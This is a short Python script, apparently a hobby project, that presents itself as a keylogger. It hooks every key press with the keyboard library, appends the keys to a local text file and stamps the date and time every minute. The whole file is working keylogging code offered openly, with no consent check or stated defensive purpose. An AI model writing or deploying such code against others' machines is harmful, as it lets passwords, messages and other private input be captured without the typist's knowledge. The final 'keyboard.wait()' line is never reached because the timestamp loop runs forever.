# KeyChronicle.py - just a Python key logger
# Writed by : SlahtalabMohsen 
# My GitHub : https://github.com/SlahtalabMohsen

# Importing necessary library's
import keyboard
import datetime
import time

# Set the output to 'KeyChronicleData.txt' text file
output_file = 'KeyChronicleData.txt'

# Create a function to Write the key to the output file
def save_key(e):
    key = e.name
    with open(output_file, 'a') as f:
            if key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            else:
                f.write(key)

# Calling our function to record our key press's
keyboard.on_press(save_key)

# Create a function to log the date and time every one minute
def log_date_time():
    while True:
        with open(output_file, 'a') as f:
            f.write(f"\n Date/Time: {datetime.datetime.now()} \n")
        time.sleep(60)  # sleep for 60 seconds (1 minute)

print("Im Listening...")

# Start logging the date and time every one minute
log_date_time()

# Start the keyboard listener
keyboard.wait()

